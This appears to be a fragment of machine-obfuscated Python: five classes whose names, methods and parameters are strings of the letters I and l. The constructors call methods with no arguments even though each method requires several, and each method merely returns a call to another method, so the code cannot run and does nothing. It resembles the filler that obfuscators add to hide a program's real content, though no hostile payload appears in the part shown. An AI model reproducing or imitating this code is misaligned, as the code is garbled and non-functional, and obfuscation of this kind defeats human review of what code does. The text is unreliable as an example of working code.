        return IlIIllIlIlIII.IIIIlIlllIlIllIIIll()
    def IIlIlIIlI(IlIIllIlIlIII, llllIIlIlIlIIIl, lIIIllllllIllllIIIl, IllIIIIIIIIIlll, IllIllllIlIlIlIIIllI, IllIlIllllllllI):
        return IlIIllIlIlIII.llIIIIllIIlIlIII()
class llllIIlIIl:
    def __init__(IlIIllIlIlIII):
        IlIIllIlIlIII.llIIlllIIlI()
        IlIIllIlIlIII.llIllIlIIllIIlIIII()
        IlIIllIlIlIII.llIllllllIIlll()
        IlIIllIlIlIII.llIIlIIIllIIlI()
        IlIIllIlIlIII.IllIIlllIIIlIIlI()
        IlIIllIlIlIII.IIllIlIlIIIlllIII()
        IlIIllIlIlIII.lllIIlIlI()
        IlIIllIlIlIII.IIllIlIlllllI()
        IlIIllIlIlIII.IIIlIlIIlIIllllIIII()
        IlIIllIlIlIII.IIIIIIlIllIIll()
        IlIIllIlIlIII.IIlIllIIIIllIIl()
        IlIIllIlIlIII.lIIIlIIllllllIIIIlI()
        IlIIllIlIlIII.lIllIIIlIlllllI()
        IlIIllIlIlIII.IllllIlI()
        IlIIllIlIlIII.IIlIlIIIIIIl()
    def llIIlllIIlI(IlIIllIlIlIII, IlIlIlllIIlll, lIlIllIl, IllllIIllllI, llllllllIlll):
        return IlIIllIlIlIII.IIIIIIlIllIIll()
    def llIllIlIIllIIlIIII(IlIIllIlIlIII, IIllIIllI, IllIlIlIlIll):
        return IlIIllIlIlIII.llIllllllIIlll()
    def llIllllllIIlll(IlIIllIlIlIII, lIlllIlIllIllIlI, lllllllIlIl):
        return IlIIllIlIlIII.lIIIlIIllllllIIIIlI()
    def llIIlIIIllIIlI(IlIIllIlIlIII, lllIIIIIIlIllIII, lllIIllIll, IlIIllIlllIlI):
        return IlIIllIlIlIII.IIllIlIlllllI()
    def IllIIlllIIIlIIlI(IlIIllIlIlIII, IIIllllIllll, IlIlIlIlIIIlllII, lllIIllIIlllIlIIIll, llIIllIIIIIllIllIIll):
        return IlIIllIlIlIII.llIllIlIIllIIlIIII()
    def IIllIlIlIIIlllIII(IlIIllIlIlIII, IlllllIllIlllIIll, llIlIlllllllllIll):
        return IlIIllIlIlIII.lIIIlIIllllllIIIIlI()
    def lllIIlIlI(IlIIllIlIlIII, IIlIllllIlll, IllIlIllIlllllllIIlI, lIIllIIllI, IIlllIIlIIIll, IIIlIllIllIlIIlIlI, lIlllIIlllllIIlIlIll, IllIllIIlIlIIllIII):
        return IlIIllIlIlIII.lIIIlIIllllllIIIIlI()
    def IIllIlIlllllI(IlIIllIlIlIII, IIlIIlllllllIIlIl, lIllIIll, IllIIlIlII, IIIlIIllIlII):
        return IlIIllIlIlIII.llIllllllIIlll()
    def IIIlIlIIlIIllllIIII(IlIIllIlIlIII, lIIIIIIIlIllll, lllIIlIIIlII, lllllIIIII):
        return IlIIllIlIlIII.IllIIlllIIIlIIlI()
    def IIIIIIlIllIIll(IlIIllIlIlIII, lIIlIIIIllIIl, lIIlIllIlIIIIll, lIlllllllIIIlllIIlI):
        return IlIIllIlIlIII.IIllIlIlllllI()
    def IIlIllIIIIllIIl(IlIIllIlIlIII, IlIIlllllIIIIIlI):
        return IlIIllIlIlIII.IIllIlIlIIIlllIII()
    def lIIIlIIllllllIIIIlI(IlIIllIlIlIII, IIlIllIllll, llIllIlIlllIIII, lIllIlIIIll, llIllIlIl):
        return IlIIllIlIlIII.IIIlIlIIlIIllllIIII()
    def lIllIIIlIlllllI(IlIIllIlIlIII, lIIIIllIlIlI):
        return IlIIllIlIlIII.IIlIllIIIIllIIl()
    def IllllIlI(IlIIllIlIlIII, IIlllIIlIlIIIll, llIIlIIIIl):
        return IlIIllIlIlIII.lIllIIIlIlllllI()
    def IIlIlIIIIIIl(IlIIllIlIlIII, lIIllIII, IlIIIlllIIlIlI, lIlllllII, lIlIlIIllIIlIIlIIIII, IlIIIlllllIllllII):
        return IlIIllIlIlIII.IIIlIlIIlIIllllIIII()
class lIllIlIl:
    def __init__(IlIIllIlIlIII):
        IlIIllIlIlIII.IlIlllIllllllII()
        IlIIllIlIlIII.IlIIIlIIlIlIlllIIlI()
        IlIIllIlIlIII.IlIllIlll()
        IlIIllIlIlIII.IIllllIIlIIl()
        IlIIllIlIlIII.IIllIllIIIIlIlll()
        IlIIllIlIlIII.IIIllllIllIlll()
        IlIIllIlIlIII.IIlIIIIl()
    def IlIlllIllllllII(IlIIllIlIlIII, IIIlIIIlllIl, IllIIIIIlIIIII):
        return IlIIllIlIlIII.IIllllIIlIIl()
    def IlIIIlIIlIlIlllIIlI(IlIIllIlIlIII, lllIIlIlllI, IIIIllIllIlIl, IlIIlllIlIIllll, lllIlIlIlIlIllIlIII, lIlIIIIllI):
        return IlIIllIlIlIII.IIlIIIIl()
    def IlIllIlll(IlIIllIlIlIII, IlIlIIlIllIlI, llllIIlIIIIIIllI, llIlIIlIIllIIlll, IIIIIlIIII, IIlllIIlIlIIllI, IllIIIIlIll):
        return IlIIllIlIlIII.IlIllIlll()
    def IIllllIIlIIl(IlIIllIlIlIII, IlIlIIIlIlIlllIlIlI):
        return IlIIllIlIlIII.IlIIIlIIlIlIlllIIlI()
    def IIllIllIIIIlIlll(IlIIllIlIlIII, lllllIIl, IlIlIIlIIll, lIllIlll, lIIlllIlIllIlIIlIl, llIlllIIIIll):
        return IlIIllIlIlIII.IIlIIIIl()
    def IIIllllIllIlll(IlIIllIlIlIII, lIllIlIlIIIIlIIIlIl, IIIIIIlIIIIl):
        return IlIIllIlIlIII.IIllIllIIIIlIlll()
    def IIlIIIIl(IlIIllIlIlIII, lIIIIIIlllIIlllllIll, IlIIIIlIIIlII, IllIIllI, IIIlllllIIIlIIlII):
        return IlIIllIlIlIII.IIllllIIlIIl()
class IIIlIlIIIlIlIllIIIl:
    def __init__(IlIIllIlIlIII):
        IlIIllIlIlIII.IlIIIllIIlI()
        IlIIllIlIlIII.lIllIlllII()
        IlIIllIlIlIII.llIIIlIIlII()
        IlIIllIlIlIII.llIlIlll()
        IlIIllIlIlIII.lIIlIIlIIIl()
        IlIIllIlIlIII.IlIIllIIIllIlll()
        IlIIllIlIlIII.IlIIlIlIllIllIII()
        IlIIllIlIlIII.lIlllIIIlll()
    def IlIIIllIIlI(IlIIllIlIlIII, IIlIlIll, llIlllIIIlIIll, IlIlllIIIllIIlIlIlI):
        return IlIIllIlIlIII.lIllIlllII()
    def lIllIlllII(IlIIllIlIlIII, IIllIIIIIII, lIIlIIIIIlllIIl, lIlllIIIl, IlIIIllIIII, lllIIlllllllI):
        return IlIIllIlIlIII.IlIIIllIIlI()
    def llIIIlIIlII(IlIIllIlIlIII, IllIlIIIllllIIIIIlll, IIlIllIlllIIllIl, IIIllIIIIlllIll, llIIlIIIIlIIIl, llIIIIlIlIIIIllI, IIllIIlIllIlIIII, IllIllIIllIllIlII):
        return IlIIllIlIlIII.lIIlIIlIIIl()
    def llIlIlll(IlIIllIlIlIII, lllIllIllllIlIlI):
        return IlIIllIlIlIII.lIlllIIIlll()
    def lIIlIIlIIIl(IlIIllIlIlIII, IIIlIlIlll):
        return IlIIllIlIlIII.IlIIllIIIllIlll()
    def IlIIllIIIllIlll(IlIIllIlIlIII, lIIIllIllIIlI, lllllIIIl, llIllIIIIIIlIIIl, lIIlIIlIIlIIllIIll, lIlIlIllII, llllIlllIll, lllIIlIIIlIIIIII):
        return IlIIllIlIlIII.IlIIlIlIllIllIII()
    def IlIIlIlIllIllIII(IlIIllIlIlIII, IllIlIIIlllIIIlI, lIllllIllIIIlIIlIlIl, IlllIIll, IllIIIIllll, IIIIlIlIIIl):
        return IlIIllIlIlIII.IlIIIllIIlI()
    def lIlllIIIlll(IlIIllIlIlIII, IlIIlIIl, lllIlIlII, llIIIIllIIIIllIII, IlIlIllIlIIIllI, lIIlIIlIlIIlI, lllIIIllIlIIlI):
        return IlIIllIlIlIII.IlIIIllIIlI()
class IIIIIIIIlllIll:
    def __init__(IlIIllIlIlIII):
        IlIIllIlIlIII.llIlIIIllllIIII()
        IlIIllIlIlIII.lIlllIlIllllIlIlI()
        IlIIllIlIlIII.IIlIllIl()
        IlIIllIlIlIII.IIlllIIllllIIIlIll()
        IlIIllIlIlIII.lIIlllIllllIIlllI()
        IlIIllIlIlIII.IllIIIIIlIlI()
        IlIIllIlIlIII.lllIIIlIlIIlI()
        IlIIllIlIlIII.llIllIIIllllll()
        IlIIllIlIlIII.llIlIIll()
    def llIlIIIllllIIII(IlIIllIlIlIII, llIIlIlIllI, IlIlIIIIIIIlIllI, llllllIIlllIIlIl, llIlIIlllIlllIIIlI, IlIllIIlIIllIll, IlIIIllIIlll, lIIIIIIIIllIIIIIll):
        return IlIIllIlIlIII.lllIIIlIlIIlI()
    def lIlllIlIllllIlIlI(IlIIllIlIlIII, lllIllIllIll, IlIllIlIIIIIllIIIll, IIIlIlIlIIlIllI, IIlllIIllIIIIlI, lIIlIIIlIllIlIl):
        return IlIIllIlIlIII.lIIlllIllllIIlllI()
    def IIlIllIl(IlIIllIlIlIII, IIIlllIIlIlI, lIIlIllIlI, lIIIllIllllllllIlIII, lllllIIlll):
        return IlIIllIlIlIII.IllIIIIIlIlI()
    def IIlllIIllllIIIlIll(IlIIllIlIlIII, IIIlllIIIlIl, llIIIlIlllll):
        return IlIIllIlIlIII.llIllIIIllllll()
    def lIIlllIllllIIlllI(IlIIllIlIlIII, IIIIlIllI, lIllIIIllllIlIl, IlIIlIIlIlII, IIIlIlIllIIll, IIIlIIlllIIIl):
        return IlIIllIlIlIII.llIllIIIllllll()
    def IllIIIIIlIlI(IlIIllIlIlIII, lIIIllIIlllIl, llIlIllIlIlIllIlIIIl, IIllIIIIIlllIII, IIIIlllllIIIlIllllll):
        return IlIIllIlIlIII.llIlIIll()
    def lllIIIlIlIIlI(IlIIllIlIlIII, IlIlIlIIIIlIIlIIlIll, lIllIlIlIIIllIll, IllIlllllIllI, lIIlIlIIIlllI, IlIlIlIlIlllllIIl, IIlIIlllIIl):
        return IlIIllIlIlIII.lllIIIlIlIIlI()
    def llIllIIIllllll(IlIIllIlIlIII, llllllIlII, IIlllIIllIIlII):
        return IlIIllIlIlIII.llIlIIll()
    def llIlIIll(IlIIllIlIlIII, llIIllIIIIIII, IIIllIlIlIl, IllIlIIIIlIllllll):
        return IlIIllIlIlIII.llIlIIll()
class IllIIIll:
    def __init__(IlIIllIlIlIII):
        IlIIllIlIlIII.llIllIIlllIIIllI()
        IlIIllIlIlIII.lIIIIllIIllllIlII()
        IlIIllIlIlIII.lIllIIlIIl()
        IlIIllIlIlIII.IIIIlllIIIIIllllI()
        IlIIllIlIlIII.lIlllIllll()
        IlIIllIlIlIII.IllIIIlll()
        IlIIllIlIlIII.IlIIIIlI()
        IlIIllIlIlIII.IIIlIlllI()
        IlIIllIlIlIII.llIlIlIlIllIIlIIl()
        IlIIllIlIlIII.lIlllIlllIIlIIIII()
    def llIllIIlllIIIllI(IlIIllIlIlIII, lllllIllIlIl, IIlIllIIlIlIII, lIIllIIlllI):
        return IlIIllIlIlIII.IlIIIIlI()
    def lIIIIllIIllllIlII(IlIIllIlIlIII, IIIIllIlllllIlll, llIllIIll):
        return IlIIllIlIlIII.lIIIIllIIllllIlII()
    def lIllIIlIIl(IlIIllIlIlIII, lIIlIllIIlII, IlIlllIIlI, IIlIlllI, IIIIlIIIlllIlllIllI, IlIIllIIlIIllIlIIl):
        return IlIIllIlIlIII.IlIIIIlI()
    def IIIIlllIIIIIllllI(IlIIllIlIlIII, llIIlIIIllIIlIIlI, IllIIlIIIIlIlIllIl, lllIlIIlllIlIlllI):
        return IlIIllIlIlIII.IlIIIIlI()
    def lIlllIllll(IlIIllIlIlIII, IIIIIIlIlI, lllIlIIlI, lIIIlIlllllIl, lIlIIlllI, llIlllIlIIlIIIII, IllIlllIllII):
        return IlIIllIlIlIII.llIllIIlllIIIllI()
    def IllIIIlll(IlIIllIlIlIII, llIIIIlIl, llIIllll, llIlllIlIIIIIl):
        return IlIIllIlIlIII.IllIIIlll()
    def IlIIIIlI(IlIIllIlIlIII, IlIIIIlIIIll, IIIlIIlIlIlIIllI, lIlllIlllIIIllI, IlIIlllllIIIlllIIII, lIIlllIIlIllIllIII, lIIlIIllI):
        return IlIIllIlIlIII.IIIIlllIIIIIllllI()
    def IIIlIlllI(IlIIllIlIlIII, IllIlllllIllllI, llIlIlIIllllIllIII, IIIIllllIIlIlIlllIl, IllIIlIIIIIIIIll, lIIIlIIlII, lllllIIIlIIIIIlllIll):
        return IlIIllIlIlIII.IllIIIlll()
    def llIlIlIlIllIIlIIl(IlIIllIlIlIII, lIIlIlIIlIIlIII, lllIIllIlllIlIlllI, lllllIllll):
        return IlIIllIlIlIII.IIIIlllIIIIIllllI()
    def lIlllIlllIIlIIIII(IlIIllIlIlIII, IlllIllllllIIIlIIIll, lIllIIlIIIllIIlllI, lIlIIllIlIIll, IlIIIIIlllllllIIl):
        return IlIIllIlIlIII.IlIIIIlI()